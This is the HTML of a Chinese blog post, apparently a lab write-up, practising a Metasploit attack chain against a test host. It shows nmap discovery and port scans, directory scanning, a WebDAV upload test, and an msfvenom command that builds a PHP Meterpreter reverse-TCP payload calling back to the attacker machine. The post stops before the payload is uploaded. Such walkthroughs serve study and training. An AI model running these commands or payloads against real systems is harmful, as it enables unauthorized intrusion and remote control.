@@ -1,0 +1,1382 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/02.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/02.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/02.png?v=6.5.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.5.0',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="metasploit学习主机发现 测试靶机主要为192.168.114.29,攻击机为192.168.114.176 db_nmap -v -n -sn 192.168.114.0/24">
+<meta property="og:type" content="article">
+<meta property="og:title" content="metasploit渗透流程练习">
+<meta property="og:url" content="https://cy9nusg4rd3n.github.io/2019/01/25/metasploit渗透流程练习/index.html">
+<meta property="og:site_name" content="Cy9nus&#39;s Blog">
+<meta property="og:description" content="metasploit学习主机发现 测试靶机主要为192.168.114.29,攻击机为192.168.114.176 db_nmap -v -n -sn 192.168.114.0/24">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://github.com/Cy9nusG4rd3n/images/blob/master/KMcxOzFn.jpeg?raw=true">
+<meta property="og:image" content="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190123165519.png?raw=true">
+<meta property="og:updated_time" content="2019-01-25T10:49:55.466Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="metasploit渗透流程练习">
+<meta name="twitter:description" content="metasploit学习主机发现 测试靶机主要为192.168.114.29,攻击机为192.168.114.176 db_nmap -v -n -sn 192.168.114.0/24">
+<meta name="twitter:image" content="https://github.com/Cy9nusG4rd3n/images/blob/master/KMcxOzFn.jpeg?raw=true">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Cy9nus's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://cy9nusg4rd3n.github.io/2019/01/25/metasploit渗透流程练习/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>metasploit渗透流程练习 | Cy9nus's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+	
+    <a href="https://github.com/Cy9nusG4rd3n/Cy9nusG4rd3n.github.io"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+    
+	<header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cy9nus's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">人如果没有梦想，跟咸鱼有什么区别</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cy9nusg4rd3n.github.io/2019/01/25/metasploit渗透流程练习/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cy9nus">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cy9nus's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">metasploit渗透流程练习
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-25 17:58:38 / 修改时间：18:49:55" itemprop="dateCreated datePublished" datetime="2019-01-25T17:58:38+08:00">2019-01-25</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/01/25/metasploit渗透流程练习/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2019/01/25/metasploit渗透流程练习/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="metasploit学习"><a href="#metasploit学习" class="headerlink" title="metasploit学习"></a>metasploit学习</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><ol>
+<li><strong>测试靶机主要为192.168.114.29,攻击机为192.168.114.176</strong><blockquote>
+<p>db_nmap -v -n -sn 192.168.114.0/24</p>
+</blockquote>
+</li>
+</ol>
+<a id="more"></a>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">Nmap:</span> Starting Nmap <span class="number">7.60</span> ( <span class="string">https:</span><span class="comment">//nmap.org ) at 2019-01-23 11:36 CST</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Initiating ARP Ping Scan at <span class="number">11</span>:<span class="number">36</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Scanning <span class="number">255</span> hosts [<span class="number">1</span> port/host]</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[*] <span class="string">Nmap:</span> Host is up.</span><br><span class="line">[*] <span class="string">Nmap:</span> Read data files <span class="string">from:</span> <span class="regexp">/usr/</span>bin<span class="regexp">/../</span>share/nmap</span><br><span class="line">[*] <span class="string">Nmap:</span> Nmap <span class="string">done:</span> <span class="number">256</span> IP addresses (<span class="number">63</span> hosts up) scanned <span class="keyword">in</span> <span class="number">7.80</span> seconds</span><br><span class="line">[*] <span class="string">Nmap:</span> Raw packets <span class="string">sent:</span> <span class="number">493</span> (<span class="number">13.804</span>KB) | <span class="string">Rcvd:</span> <span class="number">105</span> (<span class="number">2.940</span>KB)</span><br></pre></td></tr></table></figure>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ol start="2">
+<li><p>利用msf的db_namp端口扫描</p>
+<blockquote>
+<p>db_nmap -sV -n -v –open -sS -p0-10000 192.168.114.29</p>
+</blockquote>
+</li>
+<li><p>发现开放端口(主要测试8585)</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">Nmap:</span> PORT     STATE SERVICE     VERSION</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">22</span>/tcp   open  ssh         OpenSSH <span class="number">7.1</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">1617</span>/tcp open  rmiregistry Java RMI</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">3000</span>/tcp open  http        WEBrick httpd <span class="number">1.3</span><span class="number">.1</span> (Ruby <span class="number">2.3</span><span class="number">.3</span> (<span class="number">2016</span><span class="number">-11</span><span class="number">-21</span>))</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">4848</span><span class="regexp">/tcp open  ssl/</span>http    Oracle GlassFish <span class="number">4.0</span> (Servlet <span class="number">3.1</span>; JSP <span class="number">2.3</span>; Java <span class="number">1.8</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">5985</span><span class="regexp">/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/</span>UPnP)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8020</span>/tcp open  http        Apache httpd</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8027</span>/tcp open  unknown</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8080</span>/tcp open  http        Oracle GlassFish <span class="number">4.0</span> (Servlet <span class="number">3.1</span>; JSP <span class="number">2.3</span>; Java <span class="number">1.8</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8282</span><span class="regexp">/tcp open  http        Apache Tomcat/</span>Coyote JSP engine <span class="number">1.1</span></span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8383</span><span class="regexp">/tcp open  ssl/</span>http    Apache httpd</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8585</span><span class="regexp">/tcp open  http        Apache httpd 2.2.21 ((Win64) PHP/</span><span class="number">5.3</span><span class="number">.10</span> DAV/<span class="number">2</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">9200</span>/tcp open  http        Elasticsearch REST API <span class="number">1.1</span><span class="number">.1</span> (<span class="string">name:</span> Jean Grey-Summers; Lucene <span class="number">4.7</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> MAC <span class="string">Address:</span> <span class="number">00</span>:<span class="number">0</span><span class="string">C:</span><span class="number">29</span>:<span class="string">E5:</span><span class="string">F7:</span><span class="number">74</span> (VMware)</span><br><span class="line">[*] <span class="string">Nmap:</span> Service <span class="string">Info:</span> <span class="string">OS:</span> Windows; <span class="string">CPE:</span> <span class="string">cpe:</span>/<span class="string">o:</span><span class="string">microsoft:</span>windows</span><br><span class="line">[*] <span class="string">Nmap:</span> Read data files <span class="string">from:</span> <span class="regexp">/usr/</span>bin<span class="regexp">/../</span>share/nmap</span><br><span class="line">[*] <span class="string">Nmap:</span> Service detection performed. Please report any incorrect results at <span class="string">https:</span><span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2837.85</span> seconds</span><br><span class="line">[*] <span class="string">Nmap:</span> Raw packets <span class="string">sent:</span> <span class="number">41973</span> (<span class="number">1.847</span>MB) | <span class="string">Rcvd:</span> <span class="number">2269</span> (<span class="number">110.612</span>KB)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><ol start="4">
+<li><p>基于msf的dir_scanner</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search dir_scan</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                Disclosure Date  Rank    Check  Description</span><br><span class="line">   ----                                ---------------  ----    -----  -----------</span><br><span class="line">   auxiliary/scanner/http/dir_scanner                   <span class="built-in">normal</span>  <span class="keyword">Yes</span>    HTTP Directory Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use auxiliary/scanner/http/dir_scanner </span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; show <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/http/dir_scanner):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                                          Required  Description</span><br><span class="line">   ----        ---------------                                          --------  -----------</span><br><span class="line">   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  <span class="keyword">no</span>        Path of word dictionary to use</span><br><span class="line">   PATH        /                                                        <span class="keyword">yes</span>       The path  to identify <span class="keyword">files</span></span><br><span class="line">   Proxies                                                              <span class="keyword">no</span>        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                                                               <span class="keyword">yes</span>       The target address range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT       <span class="number">80</span>                                                       <span class="keyword">yes</span>       The target port (TCP)</span><br><span class="line">   SSL         false                                                    <span class="keyword">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   THREADS     <span class="number">1</span>                                                        <span class="keyword">yes</span>       The number of concurrent threads</span><br><span class="line">   VHOST                                                                <span class="keyword">no</span>        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; <span class="keyword">set</span> threads <span class="comment">30</span></span><br><span class="line">threads <span class="comment">=&gt; 30</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; set rhosts 192.168.114.29</span></span><br><span class="line">rhosts <span class="comment">=&gt; 192.168.114.29</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; set rport 8585</span></span><br><span class="line">rport <span class="comment">=&gt; 8585</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; run</span></span><br><span class="line"></span><br><span class="line">[*] Detecting <span class="comment">error code</span></span><br><span class="line">[*] Using <span class="comment">code</span> <span class="comment">'404'</span><span class="comment"> as not found for 192.168.114.29</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/.../<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/cgi-bin/<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/icons/<span class="comment"> 404 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/phpmyadmin/<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/uploads/<span class="comment"> 200 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/wordpress/<span class="comment"> 200 (192.168.114.29)</span></span><br><span class="line">[*] Scanned <span class="comment">1 of 1 hosts (100% complete)</span></span><br><span class="line">[*] Auxiliary <span class="comment">module execution completed</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发现文件上传路径/uploads</p>
+<h2 id="DAVTest上传测试"><a href="#DAVTest上传测试" class="headerlink" title="DAVTest上传测试"></a>DAVTest上传测试</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# davtest -url http:<span class="comment">//192.168.114.29:8585/uploads</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN		SUCCEED:		http:<span class="comment">//192.168.114.29:8585/uploads</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line">NOTE	Random string <span class="keyword">for</span> this session: NBIRksdIG8d</span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Creating directory</span><br><span class="line">MKCOL		FAIL</span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Sending test <span class="keyword">files</span></span><br><span class="line"><span class="keyword">PUT</span>	jhtml	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jhtml</span></span><br><span class="line"><span class="keyword">PUT</span>	pl	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.pl</span></span><br><span class="line"><span class="keyword">PUT</span>	shtml	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.shtml</span></span><br><span class="line"><span class="keyword">PUT</span>	txt	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line"><span class="keyword">PUT</span>	aspx	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspx</span></span><br><span class="line"><span class="keyword">PUT</span>	php	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line"><span class="keyword">PUT</span>	cfm	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cfm</span></span><br><span class="line"><span class="keyword">PUT</span>	jsp	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jsp</span></span><br><span class="line"><span class="keyword">PUT</span>	cgi	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cgi</span></span><br><span class="line"><span class="keyword">PUT</span>	html	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line"><span class="keyword">PUT</span>	asp	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.asp</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Checking <span class="keyword">for</span> test <span class="keyword">file</span> execution</span><br><span class="line">EXEC	jhtml	FAIL</span><br><span class="line">EXEC	pl	FAIL</span><br><span class="line">EXEC	shtml	FAIL</span><br><span class="line">EXEC	txt	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line">EXEC	aspx	FAIL</span><br><span class="line">EXEC	php	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line">EXEC	cfm	FAIL</span><br><span class="line">EXEC	jsp	FAIL</span><br><span class="line">EXEC	cgi	FAIL</span><br><span class="line">EXEC	html	SUCCEED:	http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line">EXEC	asp	FAIL</span><br><span class="line"></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line">/usr/bin/davtest Summary:</span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jhtml</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.pl</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.shtml</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspx</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cfm</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jsp</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cgi</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.asp</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发现能成功上传txt,php,html</p>
+<h2 id="制作php木马"><a href="#制作php木马" class="headerlink" title="制作php木马"></a>制作php木马</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">LHOST</span>=192.168.114.176 <span class="attribute">LPORT</span>=11111 -f<span class="built_in"> raw </span>&gt; ~/Desktop/11111.php</span><br><span class="line">[-] <span class="literal">No</span> platform was selected, choosing Msf::Module::Platform::PHP <span class="keyword">from</span> the payload</span><br><span class="line">[-] <span class="literal">No</span> arch selected, selecting arch: php <span class="keyword">from</span> the payload</span><br><span class="line"><span class="literal">No</span> encoder <span class="keyword">or</span> badchars specified, outputting<span class="built_in"> raw </span>payload</span><br><span class="line">Payload size: 30659 bytes</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>上传一句话菜刀连接也行,但这里主要是基于metasploit的学习，最终远控，权限提升</p>
